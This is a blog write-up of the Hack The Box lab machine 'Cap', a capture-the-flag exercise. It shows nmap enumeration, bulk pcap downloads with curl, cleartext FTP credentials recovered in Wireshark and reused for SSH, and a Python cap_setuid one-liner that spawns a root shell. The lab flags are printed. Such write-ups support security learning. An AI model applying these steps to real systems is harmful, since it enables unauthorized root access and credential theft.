---
layout: post
title: 'Hack The Box Writeup: Cap'
date: '2021-07-29 15:12:11 -0400'
categories: ctf
tags: htb web privesc network
---

![Machine avatar](https://www.hackthebox.eu/storage/avatars/70ea3357a2d090af11a0953ec8717e90.png)

## Port Scan
First run an nmap scan with service enumeration, default scripts, and OS identification.
```bash
nmap 10.10.10.245 -sV -sC -O
```
Which gives the following output:
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn
| fingerprint-strings: 
...
|_http-server-header: gunicorn
|_http-title: Security Dashboard
...
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

There are three open ports at this address. An FTP server on port 21, SSH server on port 22, and   an HTTP server on port 80. The HTTP server is running Gunicorn which is Python web server similar to Flask.

## Web Enumeration
Lets hop into a browser and check out the web server. Visiting it, we see there are 4 tabs we can visit.

> 10.10.10.245

![tab 1](/assets/img/tab1.jpg)
*A visual representation of security events, failed login attempts, and port scans over the last 24 hours at this ip address.*
> 10.10.10.245/data/0

![tab 2](/assets/img/tab2.jpg)
*Pressing the second tab for the security snapshot goes to /capture. This in turn redirects to /data/ followed by a number. We can manually change this to 0 or any other number. On this page we can also download a pcap file corresponding to this number.*

Presumably we will need to investigate some of these pcap files with Wireshark as the name of the box is "Cap". Also note that pressing download redirects to /download/0. This way we can download pcap files directly from a url including indices which are missing data pages like at /data/9.
> 10.10.10.245/ip

![tab 3](/assets/img/tab3.jpg)
*The output of the ip shell command at 10.10.10.245*
> 10.10.10.245/netstat

![tab 4](/assets/img/tab4.jpg)
*The output of the netstat shell command at 10.10.10.245*

After investigation, it seems that the incrementing numbers after /data/ represent portions of the network log in chronological order. Lets start at 10.10.10.245/download/0 and download 0.pcap all the way to 10.10.10.245/download/25 for 25.pcap so we can read any part of the log with Wireshark. This can be done with this simple curl one liner:

```bash
curl http://10.10.10.245/download/[0-25] -O
```

## Packet Analysis
First, let's open 0.pcap from Wireshark.
Sorting the packets by protocol and examining the FTP traffic we can immediately see an unencrypted FTP login.
![Wireshark log](/assets/img/wire0.jpg)
From this traffic we get the following username and password to login to the FTP server.

> USER nathan
> PASS Buck3tH4TF0RM3!

We can also see that this same user retrieved a file named notes.txt before the log ends.
## FTP Enumeration
Login to the ftp server with

```bash
ftp 10.10.10.245
```

Then entering nathan's username and password we succesfully logged in! In nathan's home directory there is a file called user.txt which holds the first flag for HTB.

> f8ee4208619dd70ee616d7cd81628906

To get a shell, lets try to connect to ssh server that is running with the same credentials

```bash 
ssh nathan@10.10.10.245
```
```
    ...
    Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
    ...
    nathan@cap:~$ ls
    linpeas.sh  ls.txt  snap  user.txt  user2.txt
```
Somebody else conveniently already downloaded linpeas.sh so we can do linux enumeration without having to scp that.
## Linux Privilege Escalation
To get linpeas.sh if it is not already on this system, run the scp command using nathan's account then ssh in on port 22.

```bash
./linpeas.sh
```
  
One interesting line in the enumeration results is:

> /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip

It seems that this python binary has the capability to set the user id to root. We can do this by running python code which sets the uid then executes a new shell.

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

And now we are root!
The last flag is located at /root/root.txt
 
```bash
cat root.txt
```

> e516cb179c03e3c916f04f2acef5b4bc

With that, we have pwned this machine
